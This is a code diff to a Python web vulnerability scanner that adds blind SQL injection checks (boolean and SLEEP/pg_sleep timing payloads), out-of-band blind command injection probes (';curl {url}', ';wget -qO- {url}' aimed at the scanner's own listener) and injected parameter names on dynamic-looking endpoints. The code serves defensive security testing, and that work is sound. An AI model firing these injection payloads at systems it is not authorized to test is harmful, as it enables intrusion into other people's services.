@@ -14,6 +14,7 @@ import contextlib
 import json
 import re
 import tempfile
+import time
 from collections.abc import Sequence
 from dataclasses import dataclass
 from pathlib import Path
@@ -26,14 +27,34 @@ from shaidra.core.events import EventBus
 from shaidra.core.models import Category, Finding, FormTarget, JsonValue, LogLevel, ScanContext, Severity
 from shaidra.utils.oob import InteractionServer
 from shaidra.utils.process import RunOptions, run_tool, stream_lines
+from shaidra.utils.http import make_http_client
 from shaidra.utils.rate_limiter import RateLimiter
 
 STAGE_NAME: Final[str] = "Web vulns"
 MAX_INPUT: Final[int] = 500
 MAX_DALFOX: Final[int] = 50
 MAX_SQLMAP: Final[int] = 3
-MAX_OWN_PROBES: Final[int] = 120
+MAX_OWN_PROBES: Final[int] = 180
 MAX_XXE_URLS: Final[int] = 40
+_MAX_PARAMS_PER_URL: Final[int] = 6
+_MAX_PROBE_URLS: Final[int] = 2000
+# Endpoints that look dynamic get common parameter names injected as a
+# lowest-priority fallback, so JS-only targets (no query string, no form) still
+# expose parameters for the injection detectors to exercise.
+_DYNAMIC_HINT_RE: Final[re.Pattern[str]] = re.compile(
+    r"/(?:api|rest|graphql|v\d+|search|query|user|users|account|profile|item|items|"
+    r"product|products|order|orders|list|view|detail|page|admin|auth|login|signin|"
+    r"upload|download|file|files|redirect|callback|webhook|fetch|proxy|url|data|"
+    r"comment|article|report|export|import|filter|sort|find)(?:/|$)",
+    re.IGNORECASE,
+)
+_DYNAMIC_EXT_RE: Final[re.Pattern[str]] = re.compile(
+    r"\.(?:php|asp|aspx|jsp|jspx|do|action|cgi|pl|py|rb)\b", re.IGNORECASE
+)
+_INJECT_PARAMS: Final[tuple[str, ...]] = (
+    "id", "q", "query", "search", "page", "file", "path", "url", "redirect",
+    "callback", "user", "lang", "type", "cmd",
+)
 _MAX_CSRF: Final[int] = 25
 _MAX_SSRF: Final[int] = 40
 _OOB_WAIT: Final[float] = 2.5
@@ -94,6 +115,29 @@ _SQL_ERROR_RE: Final[re.Pattern[str]] = re.compile(
     r"ora-\d{4,5}|microsoft odbc|microsoft jet|java\.sql\.sqlexception",
     re.IGNORECASE,
 )
+# Blind SQLi: TRUE/FALSE conditions of identical length, so a reflected echo
+# cannot fake the length difference — only a real boolean oracle can.
+_SQL_BOOL_PAIRS: Final[tuple[tuple[str, str], ...]] = (
+    ("' AND '1'='1", "' AND '1'='2"),
+    (" AND 1=1", " AND 1=2"),
+)
+# Time-based probes; a genuine SLEEP shows up as a delay far past the endpoint's
+# own response time, confirmed with a second sample to avoid a flaky hit.
+_SQL_TIME_PAYLOADS: Final[tuple[str, ...]] = (
+    "' AND SLEEP(2)-- -",
+    " AND SLEEP(2)",
+    "'||pg_sleep(2)||'",
+    " AND pg_sleep(2)-- -",
+)
+_SQL_TIME_DELAY: Final[float] = 1.6
+_MAX_TIME_PROBES: Final[int] = 10
+# Shell metacharacter payloads that fetch a callback URL; a hit proves command
+# execution even when the command's output never reaches the response (blind).
+_CMDI_OOB_TEMPLATES: Final[tuple[str, ...]] = (
+    ";curl {url}",
+    ";wget -qO- {url}",
+)
+_MAX_CMDI_OOB: Final[int] = 12
 _NUCLEI_TAGS: Final[str] = "xss,sqli,ssrf,idor,lfi,rce,xxe"
 _SCHEMES: Final[tuple[str, ...]] = ("http://", "https://")
 _URL_RE: Final[re.Pattern[str]] = re.compile(r"https?://[^\s\"'<>]+")
@@ -162,7 +206,21 @@ def _input_urls(ctx: ScanContext) -> list[str]:
     return _filter_urls(ctx, seeds)
 
 
-def _filter_urls(ctx: ScanContext, source: Sequence[str]) -> list[str]:
+def _probe_urls(ctx: ScanContext) -> list[str]:
+    """All in-scope crawled URLs, at a higher cap, for building built-in probes.
+
+    The built-in engine derives one probe per parameter, so it must see every
+    discovered URL — including crawler-injected ``?name=`` variants — rather
+    than the smaller list the external-tool path feeds to nuclei.
+    """
+    urls = _filter_urls(ctx, ctx.crawled_urls, cap=_MAX_PROBE_URLS)
+    if urls:
+        return urls
+    seeds = [ctx.target_url, *(host.url for host in ctx.live_hosts() if host.url)]
+    return _filter_urls(ctx, seeds, cap=_MAX_PROBE_URLS)
+
+
+def _filter_urls(ctx: ScanContext, source: Sequence[str], cap: int = MAX_INPUT) -> list[str]:
     urls: dict[str, None] = {}
     for candidate in source:
         clean = candidate.strip()
@@ -171,7 +229,7 @@ def _filter_urls(ctx: ScanContext, source: Sequence[str]) -> list[str]:
         if not ctx.scope.in_scope(clean):
             continue
         urls[clean] = None
-        if len(urls) >= MAX_INPUT:
+        if len(urls) >= cap:
             break
     return list(urls)
 
@@ -186,7 +244,7 @@ async def _builtin_fallback(ctx: ScanContext, bus: EventBus) -> None:
     discovered forms. Every request is throttled through RateLimiter and the
     probe set is capped by MAX_OWN_PROBES.
     """
-    urls = _input_urls(ctx)
+    urls = _probe_urls(ctx)
     if not urls:
         await bus.stage_skip(STAGE_NAME, "no in-scope URLs to scan")
         return
@@ -194,6 +252,8 @@ async def _builtin_fallback(ctx: ScanContext, bus: EventBus) -> None:
         await bus.stage_skip(STAGE_NAME, "nuclei and dalfox not installed and target not reachable")
         return
     probes = _select_probes([*_query_probes(urls), *_form_probes(ctx.form_targets)])
+    if len(probes) < MAX_OWN_PROBES:
+        probes.extend(_injected_probes(urls, probes, MAX_OWN_PROBES - len(probes)))
     await bus.log(
         f"nuclei and dalfox not installed; using built-in checks on {len(probes)} parameter(s)",
         LogLevel.WARN,
@@ -202,12 +262,12 @@ async def _builtin_fallback(ctx: ScanContext, bus: EventBus) -> None:
     server = await _start_oob(ctx)
     found = 0
     try:
-        async with httpx.AsyncClient(follow_redirects=False, timeout=_OWN_TIMEOUT) as client:
+        async with make_http_client(ctx, follow_redirects=False, timeout=_OWN_TIMEOUT) as client:
             found += await _own_csrf(ctx, bus, ctx.form_targets)
             found += await _own_xxe(ctx, bus, client, limiter, urls, probes)
             if probes:
                 if server is not None:
-                    found += await _own_ssrf(ctx, bus, client, limiter, probes, server)
+                    found += await _own_oob(ctx, bus, client, limiter, probes, server)
                 found += await _own_reflection(ctx, bus, client, limiter, probes)
                 found += await _own_cmdi(ctx, bus, client, limiter, probes)
                 found += await _own_lfi(ctx, bus, client, limiter, probes)
@@ -232,7 +292,7 @@ def _query_probes(urls: Sequence[str]) -> list[_Probe]:
             continue
         base = urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
         fields = dict(pairs)
-        for name, _ in pairs[:2]:
+        for name, _ in pairs[:_MAX_PARAMS_PER_URL]:
             key = (base, name.lower())
             if key in seen:
                 continue
@@ -278,6 +338,43 @@ def _select_probes(probes: Sequence[_Probe]) -> list[_Probe]:
     return selected
 
 
+def _injected_probes(urls: Sequence[str], existing: Sequence[_Probe], budget: int) -> list[_Probe]:
+    """Seed common parameters on dynamic endpoints that expose none.
+
+    The built-in spider surfaces many routes with no query string and no form —
+    JavaScript-driven sites in particular — leaving the injection detectors with
+    nothing to test. For endpoints that look dynamic, and that no real probe
+    already covers, emit ``?name=`` probes for a curated set of names. These are
+    strictly a fallback: the caller runs them only after the real query-string
+    and form probes have claimed their share of the probe budget.
+    """
+    if budget <= 0:
+        return []
+    covered = {probe.url for probe in existing}
+    probes: list[_Probe] = []
+    seen: set[tuple[str, str]] = set()
+    for url in urls:
+        if len(probes) >= budget:
+            break
+        parts = urlsplit(url)
+        if parts.query or not parts.path or parts.path == "/":
+            continue
+        if not (_DYNAMIC_HINT_RE.search(parts.path) or _DYNAMIC_EXT_RE.search(parts.path)):
+            continue
+        base = urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
+        if base in covered:
+            continue
+        for name in _INJECT_PARAMS:
+            if len(probes) >= budget:
+                break
+            key = (base, name)
+            if key in seen:
+                continue
+            seen.add(key)
+            probes.append(_Probe(method="GET", url=base, param=name, fields={name: ""}))
+    return probes
+
+
 def _benign_value(probe: _Probe) -> str:
     """Return the probe's current value, or ``1`` when it was blank."""
     value = probe.fields.get(probe.param, "").strip()
@@ -297,6 +394,28 @@ async def _probe_once(
         return await client.get(probe.url, params=fields)
     except httpx.HTTPError:
         return None
+
+
+async def _probe_once_timed(
+    client: httpx.AsyncClient, limiter: RateLimiter, probe: _Probe, value: str
+) -> tuple[httpx.Response | None, float]:
+    """Send one throttled request and report how long the response took.
+
+    Timing starts after the rate-limiter wait so a busy limiter cannot look
+    like a server-side ``SLEEP`` in the time-based SQLi check.
+    """
+    fields = dict(probe.fields)
+    fields[probe.param] = value
+    await limiter.acquire()
+    started = time.monotonic()
+    try:
+        if probe.method == "POST":
+            response = await client.post(probe.url, data=fields)
+        else:
+            response = await client.get(probe.url, params=fields)
+    except httpx.HTTPError:
+        return None, time.monotonic() - started
+    return response, time.monotonic() - started
 
 
 def _deviates(actual: int, expected: int) -> bool:
@@ -469,7 +588,7 @@ def _ssrf_candidates(probes: Sequence[_Probe]) -> list[_Probe]:
     return selected
 
 
-async def _own_ssrf(
+async def _own_oob(
     ctx: ScanContext,
     bus: EventBus,
     client: httpx.AsyncClient,
@@ -477,23 +596,33 @@ async def _own_ssrf(
     probes: Sequence[_Probe],
     server: InteractionServer,
 ) -> int:
-    """Inject callback URLs into URL-ish parameters and flag server-side fetches.
+    """Prove SSRF and blind command injection through out-of-band callbacks.
 
-    Every request is sent first, then Shaidra waits once for callbacks, so the
-    wait is paid a single time regardless of how many parameters were tested.
+    SSRF injects a callback URL into URL-ish parameters; blind CMDi injects a
+    shell command that fetches the same listener, proving execution even when
+    the command's output never reaches the response. Every request is sent
+    first, then Shaidra waits once, so the wait is paid a single time.
     """
     callback_host = ctx.config.oob_host or "127.0.0.1"
-    pending: list[tuple[_Probe, str]] = []
+    ssrf_pending: list[tuple[_Probe, str]] = []
     for probe in _ssrf_candidates(probes):
         token = server.new_token()
         response = await _probe_once(client, limiter, probe, server.callback_url(token, callback_host))
         if response is not None:
-            pending.append((probe, token))
-    if not pending:
+            ssrf_pending.append((probe, token))
+    cmdi_pending: list[tuple[_Probe, str, str]] = []
+    for probe in probes[:_MAX_CMDI_OOB]:
+        for template in _CMDI_OOB_TEMPLATES:
+            token = server.new_token()
+            payload = template.format(url=server.callback_url(token, callback_host))
+            response = await _probe_once(client, limiter, probe, payload)
+            if response is not None:
+                cmdi_pending.append((probe, token, payload))
+    if not (ssrf_pending or cmdi_pending):
         return 0
     await asyncio.sleep(_OOB_WAIT)
     found = 0
-    for probe, token in pending:
+    for probe, token in ssrf_pending:
         if not server.received(token):
             continue
         found += 1
@@ -517,6 +646,30 @@ async def _own_ssrf(
                 raw={"param": probe.param, "method": probe.method, "token": token},
             )
         )
+    for probe, token, payload in cmdi_pending:
+        if not server.received(token):
+            continue
+        found += 1
+        await bus.finding(
+            Finding(
+                title="OS command injection (blind)",
+                severity=Severity.HIGH,
+                category=Category.WEBVULN,
+                host=_host_of(probe.url, ctx.target),
+                tool="shaidra",
+                url=probe.url,
+                evidence=(
+                    f"{probe.method} {probe.url} [{probe.param}] ran {payload!r} and fetched "
+                    f"{server.callback_url(token, callback_host)}"
+                ),
+                description=(
+                    f"The {probe.param!r} parameter is passed to a shell: the injected command "
+                    f"{payload!r} made the server fetch Shaidra's listener, proving command execution "
+                    "even without output in the response (blind OS command injection)."
+                ),
+                raw={"param": probe.param, "method": probe.method, "payload": payload, "token": token},
+            )
+        )
     return found
 
 
@@ -528,6 +681,11 @@ async def _own_reflection(
     for probe in probes:
         response = await _probe_once(client, limiter, probe, _REFLECTION_MARKER)
         if response is None or response.status_code != 200:
+            continue
+        content_type = response.headers.get("content-type", "").lower()
+        if content_type and "html" not in content_type:
+            # A JSON/text echo is not reflected XSS: the browser will not render
+            # the marker as markup, so flagging it would be a false positive.
             continue
         text = response.text
         if _REFLECTION_MARKER in text:
@@ -673,7 +831,7 @@ async def _own_ssti(
 async def _own_sqli(
     ctx: ScanContext, bus: EventBus, client: httpx.AsyncClient, limiter: RateLimiter, probes: Sequence[_Probe]
 ) -> int:
-    """Flag SQL error patterns, and quotes that break a response beyond its own drift.
+    """Detect SQL injection in-band (errors/quotes) and blind (boolean/time).
 
     A stateful endpoint can grow on every request (for example a page that
     appends a row), which would fake a length difference. Two identical benign
@@ -681,6 +839,7 @@ async def _own_sqli(
     from that drift before it counts as a differential.
     """
     found = 0
+    time_budget = _MAX_TIME_PROBES
     for probe in probes:
         original = _benign_value(probe)
         first = await _probe_once(client, limiter, probe, original)
@@ -697,43 +856,152 @@ async def _own_sqli(
             and control.status_code == 200
             and not _deviates(len(control.text), len(second.text) + drift)
         )
-        for payload in _SQL_PAYLOADS:
-            response = await _probe_once(client, limiter, probe, original + payload)
-            if response is None:
-                continue
-            error_hit = bool(_SQL_ERROR_RE.search(response.text))
-            differential = (
-                not error_hit
-                and stable
-                and response.status_code == 200
-                and _deviates(len(response.text), len(control.text) + drift)
-            )
-            if not (error_hit or differential):
-                continue
+        if await _sqli_inband(ctx, bus, client, limiter, probe, original, drift, len(control.text), stable):
             found += 1
-            outcome = (
-                "produced a database error pattern"
-                if error_hit
-                else "changed the response beyond the endpoint's own drift"
+            continue
+        base_len = len(second.text) + drift
+        if await _sqli_boolean_blind(ctx, bus, client, limiter, probe, original, base_len):
+            found += 1
+            continue
+        if time_budget > 0:
+            time_budget -= 1
+            if await _sqli_time_blind(ctx, bus, client, limiter, probe, original):
+                found += 1
+    return found
+
+
+async def _sqli_inband(
+    ctx: ScanContext,
+    bus: EventBus,
+    client: httpx.AsyncClient,
+    limiter: RateLimiter,
+    probe: _Probe,
+    original: str,
+    drift: int,
+    control_len: int,
+    stable: bool,
+) -> bool:
+    """Flag a quote payload that raises a DB error or breaks the response."""
+    for payload in _SQL_PAYLOADS:
+        response = await _probe_once(client, limiter, probe, original + payload)
+        if response is None:
+            continue
+        error_hit = bool(_SQL_ERROR_RE.search(response.text))
+        differential = (
+            not error_hit
+            and stable
+            and response.status_code == 200
+            and _deviates(len(response.text), control_len + drift)
+        )
+        if not (error_hit or differential):
+            continue
+        outcome = (
+            "produced a database error pattern"
+            if error_hit
+            else "changed the response beyond the endpoint's own drift"
+        )
+        await bus.finding(
+            Finding(
+                title="SQL injection",
+                severity=Severity.HIGH,
+                category=Category.WEBVULN,
+                host=_host_of(probe.url, ctx.target),
+                tool="shaidra",
+                url=probe.url,
+                evidence=f"{probe.method} {probe.url} [{probe.param}={original + payload}] {outcome}",
+                description=(
+                    f"A {payload!r} quote in the {probe.param!r} parameter alters the query result, "
+                    "indicating the value reaches SQL without sanitization. Confirm manually."
+                ),
+                raw={"param": probe.param, "method": probe.method, "payload": payload, "differential": differential},
             )
+        )
+        return True
+    return False
+
+
+async def _sqli_boolean_blind(
+    ctx: ScanContext,
+    bus: EventBus,
+    client: httpx.AsyncClient,
+    limiter: RateLimiter,
+    probe: _Probe,
+    original: str,
+    base_len: int,
+) -> bool:
+    """Flag a boolean oracle: a TRUE condition keeps the page, a FALSE one breaks it.
+
+    Both payloads are the same length, so an echo-only page cannot differ in
+    length; only a query that evaluates the condition changes the response.
+    """
+    for true_payload, false_payload in _SQL_BOOL_PAIRS:
+        true_resp = await _probe_once(client, limiter, probe, original + true_payload)
+        false_resp = await _probe_once(client, limiter, probe, original + false_payload)
+        if true_resp is None or false_resp is None:
+            continue
+        if true_resp.status_code != 200 or false_resp.status_code != 200:
+            continue
+        if _deviates(len(false_resp.text), base_len) and not _deviates(len(true_resp.text), base_len):
             await bus.finding(
                 Finding(
-                    title="SQL injection",
+                    title="SQL injection (boolean-based blind)",
                     severity=Severity.HIGH,
                     category=Category.WEBVULN,
                     host=_host_of(probe.url, ctx.target),
                     tool="shaidra",
                     url=probe.url,
-                    evidence=f"{probe.method} {probe.url} [{probe.param}={original + payload}] {outcome}",
-                    description=(
-                        f"A {payload!r} quote in the {probe.param!r} parameter alters the query result, "
-                        "indicating the value reaches SQL without sanitization. Confirm manually."
+                    evidence=(
+                        f"{probe.method} {probe.url} [{probe.param}] answering differently to "
+                        f"{true_payload!r} (TRUE) vs {false_payload!r} (FALSE)"
                     ),
-                    raw={"param": probe.param, "method": probe.method, "payload": payload, "differential": differential},
+                    description=(
+                        f"The {probe.param!r} parameter evaluates a boolean condition: a TRUE clause keeps "
+                        "the normal page while a FALSE clause changes it, with no visible SQL error — "
+                        "boolean-based blind SQL injection. Confirm manually."
+                    ),
+                    raw={"param": probe.param, "method": probe.method, "true": true_payload, "false": false_payload},
                 )
             )
-            break
-    return found
+            return True
+    return False
+
+
+async def _sqli_time_blind(
+    ctx: ScanContext, bus: EventBus, client: httpx.AsyncClient, limiter: RateLimiter, probe: _Probe, original: str
+) -> bool:
+    """Flag a SLEEP/pg_sleep payload that reliably delays the response."""
+    baseline_resp, baseline = await _probe_once_timed(client, limiter, probe, original)
+    if baseline_resp is None or baseline_resp.status_code != 200:
+        return False
+    for payload in _SQL_TIME_PAYLOADS:
+        response, elapsed = await _probe_once_timed(client, limiter, probe, original + payload)
+        if response is None or elapsed < baseline + _SQL_TIME_DELAY:
+            continue
+        confirm, second_elapsed = await _probe_once_timed(client, limiter, probe, original + payload)
+        if confirm is None or second_elapsed < baseline + _SQL_TIME_DELAY:
+            continue
+        await bus.finding(
+            Finding(
+                title="SQL injection (time-based blind)",
+                severity=Severity.HIGH,
+                category=Category.WEBVULN,
+                host=_host_of(probe.url, ctx.target),
+                tool="shaidra",
+                url=probe.url,
+                evidence=(
+                    f"{probe.method} {probe.url} [{probe.param}={payload}] delayed the response to "
+                    f"{elapsed:.1f}s / {second_elapsed:.1f}s (baseline {baseline:.1f}s)"
+                ),
+                description=(
+                    f"The {probe.param!r} parameter runs a time-delay function: injecting {payload!r} makes "
+                    "the database sleep, proving the value reaches SQL unparameterized — time-based blind "
+                    "SQL injection. Confirm manually."
+                ),
+                raw={"param": probe.param, "method": probe.method, "payload": payload},
+            )
+        )
+        return True
+    return False
 
 
 def _write_url_list(urls: list[str]) -> Path | None:
